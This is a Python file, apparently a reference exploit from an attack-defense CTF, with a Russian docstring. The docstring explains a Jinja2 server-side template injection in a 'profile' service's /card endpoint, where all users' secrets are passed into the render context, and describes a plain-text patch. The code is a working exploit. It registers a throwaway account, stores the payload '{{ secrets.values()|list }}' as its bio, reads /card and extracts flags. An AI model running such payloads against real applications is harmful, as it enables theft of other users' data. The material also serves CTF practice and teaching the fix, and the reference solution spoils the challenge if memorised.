"""ЭТАЛОН: profile — SSTI (server-side template injection) в /card.

Уязвимость: /card рендерит пользовательское bio через Jinja2
render_template_string(BIOS[user], username=..., secrets=SECRETS). В контекст
рендера прокинут secrets=SECRETS — словарь со ВСЕМИ флагами всех пользователей.
Значит bio вида {{ secrets.values()|list }} при запросе своей же карточки
выводит чужие секреты (там флаги чекера).

Эксплойт: регистрируем одноразового юзера, ставим ему такое bio, читаем /card.

Патч (services/profile/app.py, card): рендерить bio как ПЛЕЙН-ТЕКСТ, а не как
шаблон — т.е. просто вернуть строку bio (Flask jsonify сам её заэкранирует),
не вызывая render_template_string. Тогда {{...}} не исполняется, а SLA
(карточка показывает сохранённый текст bio) остаётся зелёным. Как минимум —
убрать secrets из контекста рендера.
"""
import re
import requests

SERVICE = "profile"
FLAG = re.compile(r"[A-Z0-9]{31}=")

# SSTI-пейлоад: выгружает значения всех секретов из контекста рендера.
PAYLOAD = "{{ secrets.values()|list }}"


def exploit(host, port):
    base = f"http://{host}:{port}"
    u, p = "x" + str(id(object())), "p" + str(id(object()))
    try:
        r = requests.post(f"{base}/register", json={"username": u, "password": p}, timeout=4)
        tok = r.json()["token"]
        requests.post(f"{base}/bio", json={"bio": PAYLOAD},
                      headers={"Authorization": tok}, timeout=4)
        r = requests.get(f"{base}/card", headers={"Authorization": tok}, timeout=4)
    except requests.RequestException:
        return []
    return FLAG.findall(r.json().get("card", "") or "")
